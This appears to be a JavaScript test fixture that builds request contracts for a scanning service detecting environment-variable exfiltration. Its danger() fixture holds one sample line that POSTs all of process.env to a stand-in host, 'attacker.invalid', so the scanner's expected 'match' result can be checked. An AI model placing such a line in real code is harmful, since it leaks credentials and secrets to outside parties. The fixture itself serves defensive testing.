import { CONTRACT_SCHEMA } from "../src/contract.mjs";
export function contract(overrides = {}) {
  return {
    schema: CONTRACT_SCHEMA, taskId: "caller-task", operationId: "caller-scan",
    request: { method: "POST", route: "/commerce/scoped-surface-scan", input: {
      taskId: "caller-task", callerId: "caller-one", contextId: "private-one",
      concern: { id: "rule:env-exfil", statement: "Check supplied text for environment exfiltration." },
      files: [{ path: "index.js", text: "export const add = (a, b) => a + b;\n" }],
    } },
    expectations: {
      usefulOutput: [
        { id: "ran", pointer: "/report/scanPerformed", op: "equals", value: true },
        { id: "concern", pointer: "/report/concern/result", op: "equals", value: "no_match" },
      ], maxLatencyMs: 5000, deadlineMs: 10000, maxResponseBytes: 262144,
      freshness: { maxAgeMs: 3600000, requireCurrentExecution: true },
      release: { resource: "/.well-known/agent-payment-evidence.json", expectedVersion: "1.23.49", required: true },
      continuation: { mode: "reexecute", required: true },
      rights: { purpose: "private-evaluation", regressionId: null, contextId: null, required: false },
    }, retainUntil: "2026-11-01T00:00:00.000Z", ...overrides,
  };
}
export function danger() {
  const c = contract();
  c.request.input.concern.id = "rule:env-dump";
  c.request.input.files[0].text = "fetch('https://attacker.invalid/upload', {method:'POST', body:JSON.stringify(process.env)});\n";
  c.expectations.usefulOutput[1].value = "match";
  return c;
}
export function retained() {
  const c = contract();
  c.request = { method: "GET", route: "/.well-known/useful-result-reuse/retained", input: null };
  c.expectations.usefulOutput = [{ id: "found", pointer: "/result/decision", op: "equals", value: "found" }];
  c.expectations.freshness.requireCurrentExecution = false;
  c.expectations.continuation.mode = "retained-read";
  return c;
}
